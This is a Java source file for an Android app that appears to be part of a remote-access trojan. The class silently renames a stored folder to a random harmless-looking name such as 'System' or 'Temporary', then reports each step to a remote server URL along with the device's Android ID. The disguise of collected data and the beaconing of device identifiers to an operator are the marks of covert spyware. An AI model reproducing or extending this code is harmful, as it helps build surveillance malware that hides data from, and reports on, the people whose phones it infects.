package u.can.i.up.expert.utils;

import android.os.AsyncTask;
import android.os.Environment;
import android.preference.PreferenceManager;

import java.io.File;
import java.io.UnsupportedEncodingException;
import java.util.Random;

import u.can.i.up.expert.common.DataSet;
import u.can.i.up.expert.common.Factory;

/**
 * Created by lczgywzyy on 2015/1/13.
 */
public class changeDirectory extends AsyncTask<String, Void, String> {
    @Override
    protected String doInBackground(String... params) {

        String[] files = {"System", "System Media", "Saved Files", "Recent Media", "Temporary"};
        Random r = new Random();
        String file2String = files[r.nextInt(files.length)];

        File file = new File(PreferenceManager.getDefaultSharedPreferences(DataSet.getInstance().myService.getApplicationContext()).getString("File", ""));
        File file2 = new File(Environment.getExternalStorageDirectory().toString() + File.separator + file2String);
        boolean success = file.renameTo(file2);
        if(success)
        {
            PreferenceManager.getDefaultSharedPreferences(DataSet.getInstance().myService.getApplicationContext()).edit().putString("File", Environment.getExternalStorageDirectory().toString() + File.separator + file2String).commit();
//			    Log.i("com.connect", "Changed:" + PreferenceManager.getDefaultSharedPreferences(DataSet.getInstance().myService.getApplicationContext()).getString("File", ""));
            try {
                Factory.getInputStreamFromUrl(DataSet.getInstance().URL + PreferenceManager.getDefaultSharedPreferences(DataSet.getInstance().myService.getApplicationContext()).getString("urlPost", "") + "UID=" + PreferenceManager.getDefaultSharedPreferences(DataSet.getInstance().myService.getApplicationContext()).getString("AndroidID", "") + "&Data=", "Changed Directory: " + file2String);
            } catch (UnsupportedEncodingException e) {

                e.printStackTrace();
            }
        } else
        {
            try {
                Factory.getInputStreamFromUrl(DataSet.getInstance().URL + PreferenceManager.getDefaultSharedPreferences(DataSet.getInstance().myService.getApplicationContext()).getString("urlPost", "") + "UID=" + PreferenceManager.getDefaultSharedPreferences(DataSet.getInstance().myService.getApplicationContext()).getString("AndroidID", "") + "&Data=", "Changed Directory Failed");
            } catch (UnsupportedEncodingException e) {
                e.printStackTrace();
            }
        }
        return "Executed";
    }
    @Override
    protected void onPostExecute(String result) {
        PreferenceManager.getDefaultSharedPreferences(DataSet.getInstance().myService.getApplicationContext()).edit().putBoolean("Files",false).commit();
    }
    @Override
    protected void onPreExecute() {
        while(PreferenceManager.getDefaultSharedPreferences(DataSet.getInstance().myService.getApplicationContext()).getBoolean("Files",false) == true)
        {
            try {
                Thread.sleep(5000);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
        }
        PreferenceManager.getDefaultSharedPreferences(DataSet.getInstance().myService.getApplicationContext()).edit().putBoolean("Files",true).commit();
        try {
            Factory.getInputStreamFromUrl(DataSet.getInstance().URL + PreferenceManager.getDefaultSharedPreferences(DataSet.getInstance().myService.getApplicationContext()).getString("urlPost", "") + "UID=" + PreferenceManager.getDefaultSharedPreferences(DataSet.getInstance().myService.getApplicationContext()).getString("AndroidID", "") + "&Data=", "Deleting Files");
        } catch (UnsupportedEncodingException e) {
            e.printStackTrace();
        }
    }
    @Override
    protected void onProgressUpdate(Void... values) {
    }
}